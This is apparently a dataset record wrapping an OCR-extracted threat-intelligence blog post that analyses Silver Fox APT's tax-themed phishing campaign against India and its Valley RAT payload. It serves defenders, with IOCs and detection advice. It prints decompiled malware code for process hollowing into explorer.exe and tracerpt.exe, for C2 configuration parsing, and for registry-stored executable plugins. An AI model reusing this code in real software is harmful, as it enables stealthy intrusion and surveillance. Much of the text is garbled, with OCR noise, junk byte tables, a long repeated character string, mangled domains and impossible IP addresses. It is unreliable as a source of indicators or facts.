td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "free(Buffer_3);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "sub_405D70(\"L\\\"p1:\\\", Source, 0);\nsub_405D70(\"L\\\"o1:\\\", Source_2, 0);\nsub_405D70(\"L\\\"t1:\\\", 0, (int)&dword_41CA30);\nsub_405D70(\"L\\\"p2:\\\", Source_0, 0);\nsub_405D70(\"L\\\"o2:\\\", Source_1, 0);\nsub_405D70(\"L\\\"t2:\\\", 0, (int)&dword_41CC70);\nsub_405D70(\"L\\\"p3:\\\", Source_3, 0);\nsub_405D70(\"L\\\"o3:\\\", Source_4, 0);\nsub_405D70(\"L\\\"t3:\\\", 0, (int)&dword_41CE80);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6